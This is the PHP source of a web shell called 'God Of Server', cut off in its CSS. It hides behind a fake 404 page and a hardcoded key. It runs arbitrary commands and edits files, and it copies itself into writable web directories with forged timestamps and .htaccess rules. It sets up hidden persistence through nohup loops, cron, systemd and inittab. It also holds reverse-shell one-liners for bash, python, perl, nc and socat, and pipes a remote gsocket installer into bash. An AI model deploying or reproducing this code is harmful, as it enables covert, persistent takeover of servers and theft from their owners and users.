<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

$AUTH_KEY = 'GOD-OF-SERVER-ULTIMATE';
if (!isset($_GET['auth']) || $_GET['auth'] !== $AUTH_KEY) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body></body></html>';
    exit;
}

function getServerInfoHeader() {
    $info = '';
    
    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    
    $uname = @php_uname('a');
    
    $server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    
    $php_version = phpversion();
    
    $user = function_exists('get_current_user') ? get_current_user() : @exec('whoami 2>/dev/null');
    
    $info .= "SERVER : " . htmlspecialchars($server_software) . " " . htmlspecialchars($uname) . "\n";
    $info .= "IP : " . htmlspecialchars($server_ip) . " | " . htmlspecialchars($client_ip) . "\n";
    
    $named_conf = @file_get_contents('/etc/named.conf');
    $disabled_named = $named_conf === false ? 'Yes' : 'No';
    $info .= "DISABLED : " . $disabled_named . " [ /etc/named.conf ]\n";
    
    $info .= "PHP VERSION : " . htmlspecialchars($php_version) . "\n";
    $info .= "USER : " . htmlspecialchars($user);
    
    return $info;
}

$SHELL_PATH = realpath(__FILE__);
$HOME_DIR = dirname($SHELL_PATH);
$CURRENT_DIR = isset($_GET['dir']) ? realpath($_GET['dir']) : $HOME_DIR;
if (!$CURRENT_DIR || !is_dir($CURRENT_DIR)) {
    $CURRENT_DIR = $HOME_DIR;
}

class UltimateFileManager {
    private $current_path;
    private $home_path;
    
    public function __construct($current_path, $home_path) {
        $this->current_path = $current_path;
        $this->home_path = $home_path;
    }
    
    public function getDirectoryContents() {
        $result = [
            'directories' => [],
            'hidden_directories' => [],
            'files' => [],
            'hidden_files' => [],
            'current_path' => $this->current_path,
            'parent_path' => dirname($this->current_path),
            'home_path' => $this->home_path,
            'is_writable' => is_writable($this->current_path)
        ];
        
        if (!is_dir($this->current_path) || !is_readable($this->current_path)) {
            return $result;
        }
        
        $items = scandir($this->current_path);
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $full_path = $this->current_path . '/' . $item;
            $is_hidden = substr($item, 0, 1) === '.';
            $is_dir = is_dir($full_path);
            
            $owner_info = $this->getFileOwnerInfo($full_path);
            
            $file_info = [
                'name' => $item,
                'path' => $full_path,
                'size' => $is_dir ? '-' : $this->formatSize(filesize($full_path)),
                'modified' => date('Y-m-d H:i:s', filemtime($full_path)),
                'permissions' => substr(sprintf('%o', fileperms($full_path)), -4),
                'owner' => $owner_info['owner'],
                'group' => $owner_info['group'],
                'owner_name' => $owner_info['owner_name'],
                'is_writable' => is_writable($full_path),
                'is_readable' => is_readable($full_path),
                'is_executable' => is_executable($full_path),
                'extension' => $is_dir ? '' : strtolower(pathinfo($item, PATHINFO_EXTENSION))
            ];
            
            if ($is_dir) {
                if ($is_hidden) {
                    $result['hidden_directories'][] = $file_info;
                } else {
                    $result['directories'][] = $file_info;
                }
            } else {
                if ($is_hidden) {
                    $result['hidden_files'][] = $file_info;
                } else {
                    $result['files'][] = $file_info;
                }
            }
        }
        
        usort($result['directories'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['hidden_directories'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['files'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['hidden_files'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        
        return $result;
    }
    
    private function getFileOwnerInfo($path) {
        $owner = fileowner($path);
        $group = filegroup($path);
        
        if (function_exists('posix_getpwuid')) {
            $owner_info = @posix_getpwuid($owner);
            $owner_name = $owner_info ? $owner_info['name'] : $owner;
        } else {
            $owner_name = $owner;
        }
        
        if (function_exists('posix_getgrgid')) {
            $group_info = @posix_getgrgid($group);
            $group_name = $group_info ? $group_info['name'] : $group;
        } else {
            $group_name = $group;
        }
        
        return [
            'owner' => $owner,
            'group' => $group,
            'owner_name' => $owner_name,
            'group_name' => $group_name
        ];
    }
    
    public function executeCommand($command, $background = false) {
        $output = '';
        
        if ($background) {
            $command .= ' > /dev/null 2>&1 &';
        }
        
        if (function_exists('exec')) {
            @exec($command . ' 2>&1', $output_array, $return_code);
            $output = implode("\n", $output_array);
        } elseif (function_exists('shell_exec')) {
            $output = @shell_exec($command . ' 2>&1');
        } elseif (function_exists('system')) {
            ob_start();
            @system($command . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($command . ' 2>&1');
            $output = ob_get_clean();
        } else {
            $output = 'No execution methods available';
        }
        
        return $output;
    }
    
    public function readFile($path) {
        if (!file_exists($path) || !is_readable($path)) {
            return false;
        }
        return file_get_contents($path);
    }
    
    public function writeFile($path, $content) {
        $dir = dirname($path);
        if (!is_writable($dir)) {
            return false;
        }
        return file_put_contents($path, $content) !== false;
    }
    
    public function delete($path) {
        if (!file_exists($path)) {
            return false;
        }
        
        if (is_dir($path)) {
            return $this->deleteDirectory($path);
        }
        
        return unlink($path);
    }
    
    public function createDirectory($path) {
        return mkdir($path, 0755, true);
    }
    
    public function createFile($path) {
        return touch($path);
    }
    
    public function changePermissions($path, $mode) {
        return chmod($path, octdec($mode));
    }
    
    public function changeTimestamp($path, $timestamp) {
        return touch($path, $timestamp);
    }
    
    public function rename($old_path, $new_path) {
        return rename($old_path, $new_path);
    }
    
    public function copy($source, $destination) {
        if (is_dir($source)) {
            return $this->copyDirectory($source, $destination);
        }
        return copy($source, $destination);
    }
    
    public function uploadFile($tmp_path, $dest_path) {
        if (move_uploaded_file($tmp_path, $dest_path)) {
            return true;
        }
        
        return copy($tmp_path, $dest_path);
    }
    
    public function extractZip($zip_path, $extract_path) {
        if (!class_exists('ZipArchive')) {
            return false;
        }
        
        $zip = new ZipArchive;
        if ($zip->open($zip_path) === TRUE) {
            $zip->extractTo($extract_path);
            $zip->close();
            return true;
        }
        
        return false;
    }
    
    public function compressToZip($source, $destination) {
        if (!class_exists('ZipArchive')) {
            return false;
        }
        
        $zip = new ZipArchive;
        if ($zip->open($destination, ZipArchive::CREATE) !== TRUE) {
            return false;
        }
        
        if (is_dir($source)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($source),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($source) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
        } elseif (is_file($source)) {
            $zip->addFile($source, basename($source));
        }
        
        return $zip->close();
    }
    
    public function changeOwner($path, $user, $group = null) {
        if (!function_exists('chown')) {
            return false;
        }
        
        if ($group && function_exists('chgrp')) {
            return chown($path, $user) && chgrp($path, $group);
        }
        
        return chown($path, $user);
    }
    
    private function deleteDirectory($dir) {
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? $this->deleteDirectory($path) : unlink($path);
        }
        return rmdir($dir);
    }
    
    private function copyDirectory($source, $dest) {
        if (!is_dir($dest)) {
            mkdir($est, 0755, true);
        }
        
        $files = array_diff(scandir($source), ['.', '..']);
        foreach ($files as $file) {
            $srcFile = $source . '/' . $file;
            $destFile = $dest . '/' . $file;
            
            if (is_dir($srcFile)) {
                $this->copyDirectory($srcFile, $destFile);
            } else {
                copy($srcFile, $destFile);
            }
        }
        
        return true;
    }
    
    private function formatSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . ' ' . $units[$pow];
    }
}

class ShellDeployer {
    public static function findWritablePaths($base_path, $max_depth = 3) {
        $writable_paths = [];
        
        if (!is_dir($base_path)) {
            return $writable_paths;
        }
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($base_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $item) {
            if ($iterator->getDepth() > $max_depth) continue;
            
            if (is_dir($item) && is_writable($item)) {
                $has_files = false;
                $dir_files = scandir($item);
                foreach ($dir_files as $file) {
                    if ($file != '.' && $file != '..' && is_file($item . '/' . $file)) {
                        $has_files = true;
                        break;
                    }
                }
                
                if ($has_files) {
                    $writable_paths[] = $item;
                }
            }
        }
        
        return array_unique($writable_paths);
    }
    
    public static function deployShell($target_path, $shell_content, $filenames, $create_htaccess = false, $original_shell_path) {
        $results = [];
        
        if (!is_array($filenames)) {
            $filenames = [$filenames];
        }
        
        foreach ($filenames as $filename) {
            $full_path = rtrim($target_path, '/') . '/' . $filename;
            
            $oldest_timestamp = null;
            $files = scandir($target_path);
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;
                $file_path = $target_path . '/' . $file;
                $timestamp = filemtime($file_path);
                if ($oldest_timestamp === null || $timestamp < $oldest_timestamp) {
                    $oldest_timestamp = $timestamp;
                }
            }
            
            if (file_put_contents($full_path, $shell_content)) {
                if ($oldest_timestamp) {
                    touch($full_path, $oldest_timestamp, $oldest_timestamp);
                }
                
                if ($create_htaccess) {
                    $htaccess_result = self::createHtaccessProtection($target_path, $filename, $oldest_timestamp);
                } else {
                    $htaccess_result = true;
                }
                
                self::logDeployment($target_path, $full_path, $original_shell_path);
                
                $results[] = [
                    'filename' => $filename,
                    'path' => $full_path,
                    'success' => true,
                    'htaccess' => $htaccess_result,
                    'timestamp_matched' => $oldest_timestamp ? true : false
                ];
            } else {
                $results[] = [
                    'filename' => $filename,
                    'path' => $full_path,
                    'success' => false,
                    'error' => 'Cannot write file'
                ];
            }
        }
        
        return $results;
    }
    
    private static function createHtaccessProtection($path, $shell_name, $timestamp = null) {
        $server_software = $_SERVER['SERVER_SOFTWARE'] ?? '';
        $is_apache = stripos($server_software, 'apache') !== false;
        $is_nginx = stripos($server_software, 'nginx') !== false;
        $is_litespeed = stripos($server_software, 'litespeed') !== false;
        
        if ($is_apache || $is_litespeed) {
            $htaccess_content = <<<HTACCESS
<Files "$shell_name">
    Order Allow,Deny
    Allow from all
    Satisfy any
</Files>

<FilesMatch "\.(php|php\.|php[0-9]+|phtml|phps|inc|htaccess)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^$shell_name$ - [L]
    RewriteRule \.(php|php\.|php[0-9]+|phtml|phps|inc)$ - [F,L]
</IfModule>
HTACCESS;
        } elseif ($is_nginx) {
            $htaccess_content = <<<NGINX
# Nginx configuration for $shell_name
# Add this to your nginx config or .htaccess (if using Apache syntax converter)
location = /$shell_name {
    allow all;
}

location ~ \.(php|php\.|php[0-9]+|phtml|phps|inc)$ {
    deny all;
    location = /$shell_name {
        allow all;
    }
}
NGINX;
        } else {
            $htaccess_content = <<<GENERIC
# Protection for $shell_name
<Files "$shell_name">
    Order Allow,Deny
    Allow from all
</Files>

<FilesMatch "\.(php|php\.|php[0-9]+|phtml|phps|inc)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
GENERIC;
        }
        
        $htaccess_path = $path . '/.htaccess';
        
        if (file_exists($htaccess_path)) {
            $existing = file_get_contents($htaccess_path);
            if (strpos($existing, $shell_name) === false) {
                $htaccess_content = $existing . "\n\n" . $htaccess_content;
            } else {
                return true;
            }
        }
        
        if (file_put_contents($htaccess_path, $htaccess_content)) {
            if ($timestamp) {
                touch($htaccess_path, $timestamp, $timestamp);
            }
            return true;
        }
        
        return false;
    }
    
    private static function logDeployment($target_dir, $shell_path, $original_shell) {
        $log_content = date('Y-m-d H:i:s') . " | " . $shell_path . " | From: " . $original_shell . "\n";
        $log_file = dirname($original_shell) . '/.Res.txt';
        file_put_contents($log_file, $log_content, FILE_APPEND);
    }
}

class DefenseSystem {
    private $shell_path;
    
    public function __construct($shell_path) {
        $this->shell_path = $shell_path;
    }
    
    public function installNohup($interval = 0.1) {
        $stealth_locations = [
            '/dev/shm',
            '/run/lock',
            '/var/tmp',
            '/tmp/.X11-unix',
            '/var/lib/php/sessions',
            '/var/cache/nginx',
            '/var/cache/apache2',
            dirname($this->shell_path)
        ];
        
        foreach ($stealth_locations as $location) {
            if (is_dir($location) && is_writable($location)) {
                $script_path = $location . '/.systemd-helper';
                
                $script_content = '#!/bin/sh
while true; do
    sleep ' . $interval . '
    if [ ! -f "' . $this->shell_path . '" ]; then
        cp "' . __FILE__ . '" "' . $this->shell_path . '"
        chmod 644 "' . $this->shell_path . '"
    fi
    php -q "' . $this->shell_path . '" > /dev/null 2>&1 &
done';
                
                if (file_put_contents($script_path, $script_content)) {
                    chmod($script_path, 0755);
                    
                    $cmd = "nohup " . $script_path . " > /dev/null 2>&1 & echo $!";
                    $output = [];
                    @exec($cmd, $output, $return_code);
                    
                    if ($return_code === 0) {
                        return [
                            'success' => true,
                            'pid' => trim($output[0] ?? ''),
                            'script_path' => $script_path,
                            'location' => $location
                        ];
                    }
                }
            }
        }
        
        return ['success' => false, 'error' => 'No suitable location found'];
    }
    
    public function installCron($interval = '*/5') {
        $methods = [
            "echo '" . $interval . " * * * * php -q \"" . $this->shell_path . "\" > /dev/null 2>&1' | crontab - 2>/dev/null",
            
            "crontab -l 2>/dev/null | { cat; echo '" . $interval . " * * * * php -q \"" . $this->shell_path . "\" > /dev/null 2>&1'; } | crontab - 2>/dev/null",
            
            "echo '" . $interval . " * * * * root php -q \"" . $this->shell_path . "\" > /dev/null 2>&1' >> /etc/crontab 2>/dev/null",
            
            "echo '" . $interval . " * * * * php -q \"" . $this->shell_path . "\" > /dev/null 2>&1' > /etc/cron.d/.system-maintenance 2>/dev/null"
        ];
        
        foreach ($methods as $method) {
            $output = [];
            @exec($method . ' 2>&1', $output, $return_code);
            
            if ($return_code === 0) {
                return [
                    'success' => true,
                    'method' => $method,
                    'interval' => $interval
                ];
            }
        }
        
        return ['success' => false, 'error' => 'All cron installation methods failed'];
    }
    
    public function installSystemd() {
        $service_content = '[Unit]
Description=System Maintenance Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c "while true; do sleep 300; php -q ' . $this->shell_path . ' > /dev/null 2>&1; done"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target';
        
        $service_file = '/etc/systemd/system/.system-maintenance.service';
        
        if (file_put_contents($service_file, $service_content)) {
            $commands = [
                'systemctl daemon-reload 2>/dev/null',
                'systemctl enable .system-maintenance.service 2>/dev/null',
                'systemctl start .system-maintenance.service 2>/dev/null'
            ];
            
            foreach ($commands as $cmd) {
                @exec($cmd, $output, $return_code);
            }
            
            return ['success' => true, 'service_file' => $service_file];
        }
        
        return ['success' => false, 'error' => 'Cannot create systemd service'];
    }
    
    public function installInittab() {
        $inittab_line = 'gs:2345:respawn:/bin/sh -c "php -q ' . $this->shell_path . ' > /dev/null 2>&1"';
        
        if (file_put_contents('/etc/inittab', $inittab_line . "\n", FILE_APPEND)) {
            @exec('init q 2>/dev/null');
            return ['success' => true];
        }
        
        return ['success' => false];
    }
}

class BackConnect {
    public static function execute($method, $ip, $port) {
        $commands = [
            'php' => "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'bash' => "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
            'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'python3' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'perl' => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            'ruby' => "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
            'nc' => "nc -e /bin/sh $ip $port",
            'socat' => "socat TCP:$ip:$port EXEC:/bin/sh",
            'telnet' => "telnet $ip $port | /bin/sh | telnet $ip $port"
        ];
        
        if (!isset($commands[$method])) {
            return false;
        }
        
        $cmd = $commands[$method] . ' > /dev/null 2>&1 &';
        
        $output = [];
        @exec($cmd, $output, $return_code);
        
        return $return_code === 0;
    }
}

$file_manager = new UltimateFileManager($CURRENT_DIR, $HOME_DIR);
$directory_contents = $file_manager->getDirectoryContents();
$defense_system = new DefenseSystem($SHELL_PATH);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    
    $action = $_POST['action'];
    $response = ['success' => false, 'message' => ''];
    
    switch ($action) {
        case 'change_dir':
            $new_dir = $_POST['path'] ?? '';
            if (is_dir($new_dir)) {
                $response['success'] = true;
                $response['redirect'] = "?auth=" . urlencode($AUTH_KEY) . "&dir=" . urlencode($new_dir);
            }
            break;
            
        case 'execute_command':
            $command = $_POST['command'] ?? '';
            $background = isset($_POST['background']) && $_POST['background'] == '1';
            $response['output'] = $file_manager->executeCommand($command, $background);
            $response['success'] = true;
            break;
            
        case 'read_file':
            $path = $_POST['path'] ?? '';
            $content = $file_manager->readFile($path);
            if ($content !== false) {
                $response['success'] = true;
                $response['content'] = $content;
            } else {
                $response['message'] = 'Cannot read file';
            }
            break;
            
        case 'write_file':
            $path = $_POST['path'] ?? '';
            $content = $_POST['content'] ?? '';
            if ($file_manager->writeFile($path, $content)) {
                $response['success'] = true;
                $response['message'] = 'File saved successfully';
            } else {
                $response['message'] = 'Cannot write file';
            }
            break;
            
        case 'delete':
            $path = $_POST['path'] ?? '';
            if ($file_manager->delete($path)) {
                $response['success'] = true;
                $response['message'] = 'Deleted successfully';
            } else {
                $response['message'] = 'Cannot delete';
            }
            break;
            
        case 'create_dir':
            $path = $_POST['path'] ?? '';
            if ($file_manager->createDirectory($path)) {
                $response['success'] = true;
                $response['message'] = 'Directory created successfully';
            } else {
                $response['message'] = 'Cannot create directory';
            }
            break;
            
        case 'create_file':
            $path = $_POST['path'] ?? '';
            if ($file_manager->createFile($path)) {
                $response['success'] = true;
                $response['message'] = 'File created successfully';
            } else {
                $response['message'] = 'Cannot create file';
            }
            break;
            
        case 'chmod':
            $path = $_POST['path'] ?? '';
            $mode = $_POST['mode'] ?? '0644';
            if ($file_manager->changePermissions($path, $mode)) {
                $response['success'] = true;
                $response['message'] = 'Permissions changed successfully';
            } else {
                $response['message'] = 'Cannot change permissions';
            }
            break;
            
        case 'chdate':
            $path = $_POST['path'] ?? '';
            $timestamp = $_POST['timestamp'] ?? time();
            if ($file_manager->changeTimestamp($path, $timestamp)) {
                $response['success'] = true;
                $response['message'] = 'Timestamp changed successfully';
            } else {
                $response['message'] = 'Cannot change timestamp';
            }
            break;
            
        case 'chown':
            $path = $_POST['path'] ?? '';
            $user = $_POST['user'] ?? '';
            $group = $_POST['group'] ?? '';
            if ($file_manager->changeOwner($path, $user, $group)) {
                $response['success'] = true;
                $response['message'] = 'Ownership changed successfully';
            } else {
                $response['message'] = 'Cannot change ownership';
            }
            break;
            
        case 'rename':
            $old_path = $_POST['old_path'] ?? '';
            $new_path = $_POST['new_path'] ?? '';
            if ($file_manager->rename($old_path, $new_path)) {
                $response['success'] = true;
                $response['message'] = 'Renamed successfully';
            } else {
                $response['message'] = 'Cannot rename';
            }
            break;
            
        case 'upload':
            $dest_path = $_POST['dest_path'] ?? '';
            $tmp_name = $_FILES['file']['tmp_name'] ?? '';
            
            if ($tmp_name && is_uploaded_file($tmp_name)) {
                if ($file_manager->uploadFile($tmp_name, $dest_path)) {
                    $response['success'] = true;
                    $response['message'] = 'File uploaded successfully';
                } else {
                    $response['message'] = 'Upload failed';
                }
            } else {
                $response['message'] = 'No file uploaded';
            }
            break;
            
        case 'extract_zip':
            $zip_path = $_POST['zip_path'] ?? '';
            $extract_path = $_POST['extract_path'] ?? '';
            if ($file_manager->extractZip($zip_path, $extract_path)) {
                $response['success'] = true;
                $response['message'] = 'ZIP extracted successfully';
            } else {
                $response['message'] = 'Cannot extract ZIP';
            }
            break;
            
        case 'compress_zip':
            $source = $_POST['source'] ?? '';
            $destination = $_POST['destination'] ?? '';
            if ($file_manager->compressToZip($source, $destination)) {
                $response['success'] = true;
                $response['message'] = 'Compressed to ZIP successfully';
            } else {
                $response['message'] = 'Cannot create ZIP';
            }
            break;
            
        case 'backconnect':
            $method = $_POST['method'] ?? 'php';
            $ip = $_POST['ip'] ?? '';
            $port = $_POST['port'] ?? '4444';
            
            if (filter_var($ip, FILTER_VALIDATE_IP) && is_numeric($port) && $port > 0 && $port <= 65535) {
                if (BackConnect::execute($method, $ip, $port)) {
                    $response['success'] = true;
                    $response['message'] = 'Backconnect initiated';
                } else {
                    $response['message'] = 'Backconnect failed';
                }
            } else {
                $response['message'] = 'Invalid IP or port';
            }
            break;
            
        case 'deploy':
            $base_path = $_POST['base_path'] ?? '/var/www';
            $paths = ShellDeployer::findWritablePaths($base_path);
            $response['success'] = true;
            $response['paths'] = $paths;
            break;
            
        case 'deploy_shell':
            $target_path = $_POST['target_path'] ?? '';
            $filenames = $_POST['filenames'] ?? 'config.php';
            $create_htaccess = isset($_POST['create_htaccess']) && $_POST['create_htaccess'] == '1';
            
            if (!is_array($filenames)) {
                $filenames = array_map('trim', explode(',', $filenames));
            }
            
            $shell_content = file_get_contents(__FILE__);
            $results = ShellDeployer::deployShell($target_path, $shell_content, $filenames, $create_htaccess, __FILE__);
            
            $response['success'] = true;
            $response['results'] = $results;
            $response['message'] = 'Deployment completed';
            break;
            
        case 'install_gsocket':
            $cmd = "bash -c \"\$(curl -fsSL https://gsocket.io/x)\" 2>&1";
            if (!$cmd) {
                $cmd = "wget -qO- https://gsocket.io/x | bash 2>&1";
            }
            $output = $file_manager->executeCommand($cmd);
            $response['success'] = true;
            $response['output'] = $output;
            break;
            
        case 'port_check':
            $cmd = "netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null || sockstat -l 2>/dev/null";
            $output = $file_manager->executeCommand($cmd);
            $response['success'] = true;
            $response['output'] = $output;
            break;
            
        case 'find_backdoors':
            $path = $_POST['path'] ?? '/';
            $cmd = "find $path -type f -name '*.php' -o -name '*.ph*' -o -name '*.phtml' 2>/dev/null | xargs grep -l 'eval\|base64_decode\|gzinflate\|shell_exec\|system\|passthru' 2>/dev/null | head -50";
            $output = $file_manager->executeCommand($cmd);
            $response['success'] = true;
            $response['output'] = $output;
            break;
            
        case 'install_defense':
            $defense_type = $_POST['defense_type'] ?? 'nohup';
            
            switch ($defense_type) {
                case 'nohup':
                    $result = $defense_system->installNohup();
                    $response = array_merge($response, $result);
                    $response['message'] = $result['success'] ? 'Nohup defense installed' : 'Nohup installation failed';
                    break;
                    
                case 'cron':
                    $result = $defense_system->installCron();
                    $response = array_merge($response, $result);
                    $response['message'] = $result['success'] ? 'Cron defense installed' : 'Cron installation failed';
                    break;
                    
                case 'systemd':
                    $result = $defense_system->installSystemd();
                    $response = array_merge($response, $result);
                    $response['message'] = $result['success'] ? 'Systemd defense installed' : 'Systemd installation failed';
                    break;
                    
                case 'inittab':
                    $result = $defense_system->installInittab();
                    $response = array_merge($response, $result);
                    $response['message'] = $result['success'] ? 'Inittab defense installed' : 'Inittab installation failed';
                    break;
            }
            break;
            
        case 'check_defense':
            $checks = [
                'nohup' => "ps aux | grep -v grep | grep 'systemd-helper'",
                'cron' => "crontab -l 2>/dev/null | grep -i 'php.*" . basename(__FILE__) . "' || grep -r 'php.*" . basename(__FILE__) . "' /etc/cron* 2>/dev/null",
                'systemd' => "systemctl status .system-maintenance.service 2>/dev/null"
            ];
            
            $results = [];
            foreach ($checks as $type => $cmd) {
                $output = $file_manager->executeCommand($cmd);
                $results[$type] = !empty(trim($output));
            }
            
            $response['success'] = true;
            $response['results'] = $results;
            break;
    }
    
    echo json_encode($response);
    exit;
}

$server_info_header = getServerInfoHeader();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>God Of Server</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400..900&family=Ysabeau+SC:wght@1..1000&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0f172a;
            --bg-secondary: #1e293b;
            --bg-tertiary: #334155;
            --text-primary: #f1f5f9;
            --text-secondary: #cbd5e1;
            --text-muted: #94a3b8;
            --accent-blue: #3b82f6;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --accent-yellow: #f59e0b;
            --accent-purple: #8b5cf6;
            --border-color: #475569;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            font-size: 16px;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 24px 32px;
            margin-bottom: 24px;
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--border-color);
        }
        
        .header-top {
            margin-bottom: 20px;
        }
        
        .logo {
            font-family: 'Cinzel', serif;
            font-optical-sizing: auto;
            font-weight: 700;
            font-style: normal;
            font-size: 28px;
            color: var(--accent-blue);
            margin-bottom: 15px;
        }
        
        .server-info-header {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            background: var(--bg-tertiary);
            padding: 15px;
            border-radius: 8px;
            font-size: 15px;
            color: var(--accent-green);
            white-space: pre-wrap;
            word-break: break-all;
            border-left: 3px solid var(--accent-blue);
            line-height: 1.4;
        }
        
        .nav-tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 24px;
            background: var(--bg-secondary);
            padding: 8px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            flex-wrap: wrap;
        }
        
        .nav-btn {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 600;
            font-style: normal;
            padding: 12px 24px;
            background: transparent;
            border: none;
            border-radius: 8px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
            font-size: 16px;
        }
        
        .nav-btn:hover {
            background: var(--bg-tertiary);
            color: var(--text-primary);
        }
        
        .nav-btn.active {
            background: var(--accent-blue);
            color: white;
        }
        
        .content-section {
            display: none;
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
            box-shadow: var(--shadow-md);
            border: 1px solid var(--border-color);
        }
        
        .content-section.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .section-title {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 600;
            font-style: normal;
            font-size: 22px;
            color: var(--text-primary);
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 2px solid var(--border-color);
        }
        
        .path-navigation {
            background: var(--bg-tertiary);
            padding: 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
        }
        
        .path-breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 16px;
        }
        
        .path-segment {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            padding: 6px 12px;
            background: var(--bg-secondary);
            border-radius: 6px;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 16px;
            transition: all 0.2s;
        }
        
        .path-segment:hover {
            background: var(--accent-blue);
            color: white;
        }
        
        .path-actions {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        
        .btn {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 600;
            font-style: normal;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 16px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: var(--accent-blue);
            color: white;
        }
        
        .btn-primary:hover {
            background: #2563eb;
            transform: translateY(-1px);
        }
        
        .btn-success {
            background: var(--accent-green);
            color: white;
        }
        
        .btn-success:hover {
            background: #0da271;
            transform: translateY(-1px);
        }
        
        .btn-danger {
            background: var(--accent-red);
            color: white;
        }
        
        .btn-danger:hover {
            background: #dc2626;
            transform: translateY(-1px);
        }
        
        .btn-warning {
            background: var(--accent-yellow);
            color: white;
        }
        
        .btn-warning:hover {
            background: #d97706;
